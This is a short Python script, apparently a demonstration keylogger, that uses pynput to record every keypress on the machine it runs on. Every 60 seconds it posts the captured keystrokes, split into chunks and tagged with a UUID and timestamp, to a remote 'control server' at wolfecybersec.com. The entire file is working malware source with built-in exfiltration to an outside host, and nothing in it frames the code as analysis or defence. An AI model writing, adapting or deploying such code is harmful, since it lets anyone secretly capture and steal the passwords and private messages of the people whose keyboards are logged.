from pynput import keyboard
import threading
import requests
import uuid
import datetime
import sys

MAX_DATA_SIZE = 100
EXFILTRATION_INCREMENT = 60.0
CONTROL_SERVER = 'https://www.wolfecybersec.com/api/logger'
payload = ''
timer = 0

def sendData(uuid, payload):
    global CONTROL_SERVER
    timestamp, junk = str(datetime.datetime.now()).split('.')
    data = {
        'uuid': uuid,
        'data': payload,
        'timestamp': timestamp
    }
    res = requests.post(CONTROL_SERVER, json=data)
    print(res)

def exfiltrate(uuid):
    global MAX_DATA_SIZE, EXFILTRATION_INCREMENT, payload, timer
    timer = threading.Timer(EXFILTRATION_INCREMENT, exfiltrate, [uuid]) # exfiltration loop
    timer.start()
    if(len(payload) > 0):
        while(len(payload) > MAX_DATA_SIZE): # break up large payloads
            sendData(uuid, payload[0:MAX_DATA_SIZE])
            payload = payload[MAX_DATA_SIZE:]
        sendData(uuid, payload)
        payload = ''

def event(key):
    global payload, timer
    if key == keyboard.Key.esc:
        timer.cancel()
        sys.exit(1)
    if key == keyboard.Key.space:
        payload += ' '
    else:
        payload += str(key).replace(f'{chr(39)}', '')

listener = keyboard.Listener(on_press=event)
listener.start()
exfiltrate(str(uuid.uuid4()))
print('View successful logs at https://www.wolfecybersec.com/keylogger')
while True:
    x = ':D'